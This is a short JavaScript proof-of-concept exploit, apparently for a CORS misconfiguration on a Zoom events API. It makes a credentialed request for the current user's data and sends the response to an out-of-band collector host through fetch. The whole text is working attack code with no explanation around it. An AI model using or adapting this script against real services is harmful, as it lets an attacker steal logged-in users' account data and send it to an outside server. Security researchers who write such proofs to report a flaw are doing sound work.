var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('GET','https://events.zoom.us/api/v1/e/getCurrentUser',true); 
req.withCredentials = true;
req.send();

function reqListener() {
    fetch(('https://ck2rp5g2vtc00000argggjtcmnhyyyyyb.oast.fun/?xxx='+this.responseText))
};
